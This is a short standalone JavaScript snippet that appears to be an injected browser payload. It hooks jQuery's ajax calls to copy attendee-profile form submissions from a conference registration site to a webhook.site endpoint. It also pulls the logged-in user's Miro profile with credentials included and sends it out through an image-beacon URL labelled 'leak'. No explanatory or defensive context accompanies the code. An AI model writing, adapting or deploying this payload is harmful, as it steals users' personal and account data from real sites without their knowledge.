(function () {
  // Intercept jQuery $.ajax as before
  if (typeof $ !== 'undefined') {
    const originalAjax = $.ajax;
    $.ajax = function (options) {
      if (
        options.url &&
        options.type === 'POST' &&
        options.url.includes('/conference_registrations/') &&
        options.url.includes('/update_attendee_profile_question')
      ) {
        fetch('https://webhook.site/your-endpoint', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: typeof options.data === 'string' ? options.data : JSON.stringify(options.data)
        });
      }
      return originalAjax.apply(this, arguments);
    };
  }

  // Use an image beacon instead of fetch for profileData
  fetch("https://miro.com/api/v1/profile/", {
    method: "GET",
    credentials: "include"
  })
    .then(res => res.json())
    .then(profileData => {
      // Send via image to avoid CORS
      new Image().src = "https://webhook.site/your-endpoint?leak=" +
        encodeURIComponent(JSON.stringify(profileData));
    })
    .catch(err => console.error("Profile fetch failed or blocked:", err));
})();
